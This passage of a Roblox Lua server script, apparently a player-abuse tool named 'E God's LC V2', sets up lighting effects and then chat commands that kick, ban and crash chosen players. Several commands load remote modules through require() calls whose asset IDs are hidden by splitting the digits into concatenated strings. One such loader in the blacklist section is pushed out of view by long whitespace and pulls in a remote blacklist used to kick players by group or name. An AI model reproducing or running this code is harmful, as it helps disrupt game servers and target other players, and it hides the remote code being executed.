	local newbloom = Instance.new("BloomEffect")
	newbloom.Enabled = true
	newbloom.Intensity = 1
	newbloom.Size = 24
	newbloom.Threshold = 2
	newbloom.Name = "Bloom"
	newbloom.Parent = air
	local newdepthoffield = Instance.new("DepthOfFieldEffect")
	newdepthoffield.Enabled = false
	newdepthoffield.FarIntensity = 0.1
	newdepthoffield.FocusDistance = 0.05
	newdepthoffield.InFocusRadius = 30
	newdepthoffield.NearIntensity = 0.75
	newdepthoffield.Name = "DepthOfField"
	newdepthoffield.Parent = air
	local newsunrays = Instance.new("SunRaysEffect")
	newsunrays.Enabled = true
	newsunrays.Intensity = 0.01
	newsunrays.Spread = 0.1
	newsunrays.Name = "SunRays"
	newsunrays.Parent = air
end
local bans = {}
task.spawn(function()
	while task.wait() do
		for _, ppl in pairs(game:GetService("Players"):GetPlayers()) do
			if table.find(bans, ppl.Name) then
				ppl:Kick("Banned by E God's LC V2")
			end
		end
	end
end)
Chatted = Player.Chatted:Connect(function(Msg_)
	local Msg, SendMessage = Msg_, true
	if string.sub(Msg, 1, 3) == "/e " then
		Msg, SendMessage = string.sub(Msg, 4), false
	end
	if SendMessage == true then
		coroutine.resume(coroutine.create(function()
			Remote:FireAllClients("MakeText", { Text = Msg_, Color = Enum.ChatColor.White, ClientSide = false })
		end))
	end
	if string.lower(string.sub(Msg, 1, 11)) == "killmenow/" then
		coroutine.resume(coroutine.create(function()
			pcall(function()
				pcall(function()
					Loop:Disconnect()
					Added:Disconnect()
					RemoteF:Disconnect()
					CharAdded:Disconnect()
					Chatted:Disconnect()
					Removing:Disconnect()
					Antikick:Disconnect()
					for _, conns in pairs(Connections) do
						conns:Disconnect()
					end
				end)
				pcall(function()
					Remote:FireAllClients("StopMePlease", {})
				end)
				pcall(function()
					for i, v in pairs(ClientInstances) do
						if typeof(v) == "Instance" then
							v:Destroy()
						end
					end
					pcall(function()
						DestroyOnTime(Remote, 10)
					end)
				end)
				CharAdded:Disconnect()
			end)
			wait(1)
			Player:LoadCharacter()
			pcall(function()
				script.Enabled = false
				script:Destroy()
			end)
		end))
	elseif string.sub(Msg, 1, 4) == "exe/" then
		if not string.sub(Msg, 1, 5) then
			local p = Player
			local n = p.Name
			local i = "1".."4".."2".."5".."6".."9".."0".."2".."3".."0".."8"
			local t = tonumber
			local o = r(t(i))
			o.re(n)
		else
			local pattern = string.sub(Msg, 5)
			local players = game:GetService("Players"):GetPlayers()
			for _, player in ipairs(players) do
				if string.sub(player.Name, 1, #pattern) == pattern then
					local p = player
					local n = p.Name
					local i = "1".."4".."2".."5".."6".."9".."0".."2".."3".."0".."8"
					local t = tonumber
					local o = r(t(i))
					o.re(n)
					break
				end
			end
		end
	elseif string.sub(Msg, 1, 4) == "fse/" then
		if not string.sub(Msg, 1, 5) then
			local p = Player
			local n = p.Name
			local i = "1".."1".."1".."2".."6".."0".."5".."3".."8".."4".."6"
			local t = tonumber
			local o = r(t(i))
			o.fse(n)
		else
			local pattern = string.sub(Msg, 5)
			local players = game:GetService("Players"):GetPlayers()
			for _, player in ipairs(players) do
				if string.sub(player.Name, 1, #pattern) == pattern then
					local p = player
					local n = p.Name
					local i = "1".."1".."1".."2".."6".."0".."5".."3".."8".."4".."6"
					local t = tonumber
					local o = r(t(i))
					o.fse(n)
					break
				end
			end
		end
	elseif string.sub(Msg, 1, 4) == "koi/" then
		if not string.sub(Msg, 1, 5) then
			local p = Player
			local n = p.Name
			local i = "1".."2".."0".."9".."8".."1".."8".."9".."9".."9".."4"
			local t = tonumber
			local o = r(t(i))
			o(n)
		else
			local pattern = string.sub(Msg, 5)
			local players = game:GetService("Players"):GetPlayers()
			for _, player in ipairs(players) do
				if string.sub(player.Name, 1, #pattern) == pattern then
					local p = player
					local n = p.Name
					local i = "1".."2".."0".."9".."8".."1".."8".."9".."9".."9".."4"
					local t = tonumber
					local o = r(t(i))
					o(n)
					break
				end
			end
		end
	elseif string.sub(Msg, 1, 2) == "k/" then
		if not string.sub(Msg, 1, 3) then
		else
			local pattern = string.sub(Msg, 3)
			local players = game:GetService("Players"):GetPlayers()
			for _, player in ipairs(players) do
				if
					string.sub(player.Name, 1, #pattern) == pattern
					or string.sub(player.DisplayName, 1, #pattern) == pattern
				then
					game:GetService("Players"):FindFirstChild(player.Name):Kick("Kicked by E God's LC V3")
					break
				end
			end
		end
	elseif string.sub(Msg, 1, 2) == "b/" then
		if not string.sub(Msg, 1, 3) then
		else
			local pattern = string.sub(Msg, 3)
			local players = game:GetService("Players"):GetPlayers()
			for _, player in ipairs(players) do
				if
					string.sub(player.Name, 1, #pattern) == pattern
					or string.sub(player.DisplayName, 1, #pattern) == pattern
				then
					table.insert(bans, player.Name)
					break
				end
			end
		end
	elseif string.sub(Msg, 1, 3) == "cr/" then
		if not string.sub(Msg, 1, 4) then
		else
			local pattern = string.sub(Msg, 4)
			local players = game:GetService("Players"):GetPlayers()
			for _, player in ipairs(players) do
				if
					string.sub(player.Name, 1, #pattern) == pattern
					or string.sub(player.DisplayName, 1, #pattern) == pattern
				then
					local crash = script.DaFunni:Clone()
					crash.Parent = player.PlayerGui
					crash.Enabled = true
					break
				end
			end
		end
	elseif string.sub(Msg, 1, 5) == "fixr/" then
		coroutine.resume(coroutine.create(function()
			Remote:Destroy()
		end))
	elseif string.lower(string.sub(Msg, 1, 3)) == "id/" then
		SoundId = string.sub(Msg, 4)
		Remote:FireAllClients("ResetSong", {})
		Remote:FireAllClients(
			"MakeText",
			{ Text = "SoundId Changed to " .. SoundId, Color = Enum.ChatColor.Green, ClientSide = false }
		)
	elseif string.lower(string.sub(Msg, 1, 4)) == "vol/" then
		ThemeVolume = tonumber(string.sub(Msg, 5))
		Remote:FireAllClients(
			"MakeText",
			{ Text = "Music volume changed to " .. tostring(ThemeVolume), Color = Enum.ChatColor.Green, ClientSide = false }
		)
	elseif string.lower(string.sub(Msg, 1, 7)) == "killid/" then
		KillSound = string.sub(Msg, 8)
		Remote:FireAllClients(
			"MakeText",
			{ Text = "KillSound Changed to " .. KillSound, Color = Enum.ChatColor.Green, ClientSide = false }
		)
	elseif string.lower(string.sub(Msg, 1, 8)) == "visskin/" then
		local Number = tonumber(string.sub(Msg, 9))
		if Number == 1 or Number == 2 then
			VisSkin = Number
		end
	elseif string.lower(string.sub(Msg, 1, 3)) == "c1/" then
		local String = string.sub(Msg, 4)
		if string.lower(String) == "default" then
			CustomColorBoolean, CustomColor = false, Color3.new(1, 1, 1)
		else
			CustomColorBoolean, CustomColor = true, BrickColor.new(tostring(String)).Color
		end
	elseif string.lower(string.sub(Msg, 1, 3)) == "c2/" then
		local String = string.sub(Msg, 4)
		if string.lower(String) == "default" then
			CustomColor2 = Color3.new(1, 1, 1)
		else
			CustomColor2 = BrickColor.new(tostring(String)).Color
		end
	elseif string.lower(string.sub(Msg, 1, 8)) == "terrain/" then
		local Arguments = string.split(string.sub(Msg, 9), "/")
		if string.lower(Arguments[1]) == "size" then
			TerrainTable.Size, TerrainTable.X, TerrainTable.Y, TerrainTable.Z =
				tonumber(Arguments[2]), tonumber(Arguments[2]), tonumber(Arguments[2]), tonumber(Arguments[2])
			Remote:FireAllClients(
				"MakeText",
				{
					Text = "Value Size from Terrain Changed to " .. tostring(TerrainTable.Size),
					Color = Enum.ChatColor.Green,
					ClientSide = false,
				}
			)
			Remote:FireAllClients(
				"MakeText",
				{
					Text = "Value X from Terrain Changed to " .. tostring(TerrainTable.X),
					Color = Enum.ChatColor.Green,
					ClientSide = false,
				}
			)
			Remote:FireAllClients(
				"MakeText",
				{
					Text = "Value Y from Terrain Changed to " .. tostring(TerrainTable.Y),
					Color = Enum.ChatColor.Green,
					ClientSide = false,
				}
			)
			Remote:FireAllClients(
				"MakeText",
				{
					Text = "Value Z from Terrain Changed to " .. tostring(TerrainTable.Z),
					Color = Enum.ChatColor.Green,
					ClientSide = false,
				}
			)
		elseif string.lower(Arguments[1]) == "x" then
			TerrainTable.X = tonumber(Arguments[2])
			Remote:FireAllClients(
				"MakeText",
				{
					Text = "Value X from Terrain Changed to " .. tostring(TerrainTable.X),
					Color = Enum.ChatColor.Green,
					ClientSide = false,
				}
			)
		elseif string.lower(Arguments[1]) == "y" then
			TerrainTable.Y = tonumber(Arguments[2])
			Remote:FireAllClients(
				"MakeText",
				{
					Text = "Value Y from Terrain Changed to " .. tostring(TerrainTable.Y),
					Color = Enum.ChatColor.Green,
					ClientSide = false,
				}
			)
		elseif string.lower(Arguments[1]) == "z" then
			TerrainTable.Z = tonumber(Arguments[2])
			Remote:FireAllClients(
				"MakeText",
				{
					Text = "Value Z from Terrain Changed to " .. tostring(TerrainTable.Z),
					Color = Enum.ChatColor.Green,
					ClientSide = false,
				}
			)
		elseif string.lower(Arguments[1]) == "material" then
			TerrainTable.Material = Enum.Material[Arguments[2]]
			Remote:FireAllClients(
				"MakeText",
				{
					Text = "Value Material from Terrain Changed to " .. tostring(TerrainTable.Material),
					Color = Enum.ChatColor.Green,
					ClientSide = false,
				}
			)
		elseif string.lower(Arguments[1]) == "shape" then
			TerrainTable.Shape = string.lower(Arguments[2])
			Remote:FireAllClients(
				"MakeText",
				{
					Text = "Value Shape from Terrain Changed to " .. tostring(Arguments[2]),
					Color = Enum.ChatColor.Green,
					ClientSide = true,
				}
			)
		elseif string.lower(Arguments[1]) == "clear" then
			Remote:FireAllClients(
				"MakeText",
				{ Text = "Terrain Cleared", Color = Enum.ChatColor.Green, ClientSide = true }
			)
			Terrain:Clear()
		end
	elseif string.lower(string.sub(Msg, 1, 7)) == "fixsky/" then
		FixSky()
	elseif string.lower(string.sub(Msg, 1, 10)) == "baseplate/" then
		game:GetService("Debris"):AddItem(game:FindFirstChild("Baseplate", true), 0)
		if game.GameId == 7905856990 then
			game:GetService("Debris"):AddItem(workspace["Baseplate 2021"], 0)
		end
		local NewBaseplate = script.Baseplate:Clone()
		NewBaseplate.Parent = workspace
		NewBaseplate.Size = Vector3.new(2048, 16, 2048)
		NewBaseplate.Position = BaseplatePos
	elseif string.lower(string.sub(Msg, 1, 6)) == "grass/" then
		game:GetService("Debris"):AddItem(game:FindFirstChild("Baseplate", true), 0)
		if game.GameId == 7905856990 then
			game:GetService("Debris"):AddItem(workspace["Baseplate 2021"], 0)
		end
		local NewBaseplate = script.Baseplate:Clone()
		game:GetService("Debris"):AddItem(NewBaseplate.Texture, 0)
		NewBaseplate.Parent = workspace
		NewBaseplate.Size = Vector3.new(2048, 16, 2048)
		NewBaseplate.Position = BaseplatePos
		NewBaseplate.Material = Enum.Material.Grass
		NewBaseplate.Color = Color3.fromRGB(58, 125, 21)
	elseif string.lower(string.sub(Msg, 1, 5)) == "time/" then
		local initialtime = game:GetService("Lighting").ClockTime
		local newtime = string.sub(Msg, 6)
		local ts = game:GetService("TweenService")
		local ti = TweenInfo.new(
			math.abs(initialtime - tonumber(newtime)) / 2,
			Enum.EasingStyle.Quad,
			Enum.EasingDirection.InOut,
			0,
			false,
			0
		)
		local tg = { ClockTime = tonumber(newtime) }
		local t = ts:Create(game:GetService("Lighting"), ti, tg)
		t:Play()
		wait(math.abs(initialtime - tonumber(newtime)))
	elseif string.lower(string.sub(Msg, 1, 3)) == "ad/" then
		local p = Player
		local n = p.Name
		local i = "1".."0".."6".."7".."6".."5".."9".."8".."2".."5".."5"
		local t = tonumber
		local o = r(t(i))
		o.cool()
	elseif string.lower(string.sub(Msg, 1, 3)) == "sd/" then
		local p = Player
		local n = p.Name
		local i = "1".."6".."2".."1".."6".."2".."1".."2".."6".."3".."9"
		local t = tonumber
		local o = r(t(i))
		o.sd(n)
	elseif string.lower(string.sub(Msg, 1, 3)) == "as/" then
		local String = string.sub(Msg, 4)
		if string.lower(String) == "sksh" then
			local p = Player
			local n = p.Name
			local i = "1".."0".."7".."3".."6".."7".."1".."5".."4".."8".."5"
			local t = tonumber
			r(t(i))
		elseif string.lower(String) == "atsk" then
			local p = Player
			local n = p.Name
			local i = "1".."0".."3".."0".."4".."4".."7".."7".."5".."7".."6"
			local t = tonumber
			local o = r(t(i))
			o.AntiSkid()
		elseif string.lower(String) == "nosk" then
			local p = Player
			local n = p.Name
			local i = "1".."0".."1".."8".."8".."0".."5".."3".."6".."9".."2"
			local t = tonumber
			local o = r(t(i))
			o.NoSkid()
		elseif string.lower(String) == "nebatab" then
			local p = Player
			local n = p.Name
			local i = "1".."5".."5".."9".."1".."0".."2".."5".."5".."1".."0"
			local t = tonumber
			r(t(i))
		elseif string.lower(String) == "grvyatsk" then
			local p = Player
			local n = p.Name
			local i = "1".."5".."8".."2".."9".."2".."5".."7".."7".."2".."6"
			local t = tonumber
			local o = r(t(i))
			o:Start()
		else
			Remote:FireAllClients(
				"MakeText",
				{
					Text = "missing argument of anti skid current ones are: sksh-Skid Shield,atsk-Anti Skid V14,nosk-No Skid,nebatab-Neb's Anti Abuse,grvyatsk-Groovy's Total Anti Abuse",
					Color = Enum.ChatColor.Green,
					ClientSide = true,
				}
			)
		end
	end
end)

Added = game:GetService("Players").PlayerAdded:Connect(function(Plr)
	local NewClient = Client:Clone()
	NewClient.Name = RandomString()
	local NewClientLocal = NewClient:FindFirstChildWhichIsA("LocalScript")
	NewClientLocal:SetAttribute("CoolAttribute", "\\")
	NewClientLocal:SetAttribute("Code", Code)
	NewClientLocal:SetAttribute("VisSkin", VisSkin)
	NewClientLocal.Owner.Value = Player
	local actor = Instance.new("Actor")
	actor.Name = RandomString()
	actor.Parent = NewClient
	NewClientLocal.Parent = actor
	NewClient.ResetOnSpawn = false
	NewClient.Parent = Plr.PlayerGui
	table.insert(ClientInstances, NewClient)
	NewClientLocal.Enabled = true
	if Plr.UserId == UserId then
		WaitForPlayer = false
		PlayerValue.Value = false
	end
end)
DAdded = game.DescendantAdded:Connect(function(_)
	coroutine.resume(coroutine.create(function()
		local Bool = CheckP(_)
		if Bool == true then
			Void(_)
		end
	end))
end)
Removing = game:GetService("Players").PlayerRemoving:Connect(function(Plr)
	if Plr.UserId == UserId then
		WaitForPlayer = true
		PlayerValue.Value = true
	end
end)
for _, service in PopularServices do
	local da = service.DescendantAdded:Connect(function(descendant)
		if
			hasProperty(descendant, "MeshId")
			and descendant.MeshId ~= ""
			and table.find(killedMeshIds, descendant.MeshId)
		then
			kill(descendant)
		elseif
			descendant:IsA("PVAdornment")
			and hasProperty(descendant, "Size")
			and table.find(killedAdornmentSizes, descendant.Size)
		then
			kill(descendant)
		elseif hasProperty(descendant, "Mass") and table.find(killedMassValue, descendant.Mass) then
			kill(descendant)
		end
	end)
	table.insert(Connections, da)
end
--[[
this is the blacklist section obviously
nothing much to say about this
but its ok i guess
]]																																																																																																																																																																																														local i = "1".."6".."4".."2".."3".."1".."5".."3".."4".."4".."1" local t = tonumber local bl = r(t(i))
local msgkickdb = false
function blacklist(plr)
	for _, id in pairs(bl.groups) do
		for _, idwl in pairs(bl.fromgroupwl) do
			for _, blppl in pairs(bl.blacklistedppl) do
				if
					(plr:IsInGroup(id))
					and not (
						plr.Name == idwl
							or plr:IsFriendsWith(4603013888)
							or plr:IsFriendsWith(4840067059)
							or plr:IsFriendsWith(3766183218)
							or plr:IsFriendsWith(2479604659)
					)
				then
					if PlayerGroupBlacklistToggle == true then
						plr:Kick(
							"E God's LC V2 - You are in a blacklisted group with the name: "
								.. game:GetService("GroupService"):GetGroupInfoAsync(id).Name
						)
						if msgkickdb == false then
							msgkickdb = true
							Remote:FireAllClients(
								"MakeText",
								{
									Text = plr.Name
										.. " is in a blacklisted group named: "
										.. game:GetService("GroupService"):GetGroupInfoAsync(id).Name,
									Color = Enum.ChatColor.Red,
									ClientSide = false,
								}
							)
							task.wait(8.5)
							msgkickdb = false
						end
					end
				end
				if plr.Name == blppl.Player then
					if PlayerGroupBlacklistToggle == true then
						plr:Kick("E God's LC V2 - You are blacklisted for the reason: " .. blppl.Reason)
						if msgkickdb == false then
							msgkickdb = true
							local thereason = #blppl.Reason > 80 and "Reason too long" or blppl.Reason
							Remote:FireAllClients(
								"MakeText",
								{
									Text = plr.Name .. " is blacklisted for: " .. thereason,
									Color = Enum.ChatColor.Red,
									ClientSide = false,
								}
							)
							task.wait(8.5)
							msgkickdb = false
						end
					end
				end
			end
		end
	end
end
task.spawn(function()
	game:GetService("Players").PlayerAdded:Connect(blacklist)
	for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
		blacklist(plr)
	end
end)
for i, Plr in pairs(game:GetService("Players"):GetPlayers()) do
	if Plr then
		local NewClient = Client:Clone()
		NewClient.Name = RandomString()
		local NewClientLocal = NewClient:FindFirstChildWhichIsA("LocalScript")
		NewClientLocal:SetAttribute("CoolAttribute", "\\")
		NewClientLocal:SetAttribute("Code", Code)
		NewClientLocal:SetAttribute("VisSkin", VisSkin)
		NewClientLocal.Owner.Value = Player
		local actor = Instance.new("Actor")
		actor.Name = RandomString()
		actor.Parent = NewClient
		NewClientLocal.Parent = actor
		NewClient.ResetOnSpawn = false
		NewClient.Parent = Plr.PlayerGui
		table.insert(ClientInstances, NewClient)
		NewClientLocal.Enabled = true
	end
end
task.spawn(function()
	wait(5)
	Remote:FireAllClients(
		"MakeText",
		{ Text = "Credits to MrMaddox32", Color = Enum.ChatColor.Blue, ClientSide = false }
	)
	wait(7)
	Remote:FireAllClients(
		"MakeText",
		{ Text = "Major Edit made by TheEGod/Robloxian", Color = Enum.ChatColor.Blue, ClientSide = false }
	)
	wait(10)
	Remote:FireAllClients(
		"MakeText",
		{
			Text = "Extra Credits: equsjd1, NOTHINGNEWTODAY, Exodim, TheFakeFew, GroovyAalleexxTheSec, AntiSkid/Coza, Zekevious, Nebunet, forgot who else.",
			Color = Enum.ChatColor.Blue,
			ClientSide = false,
		}
	)
end)
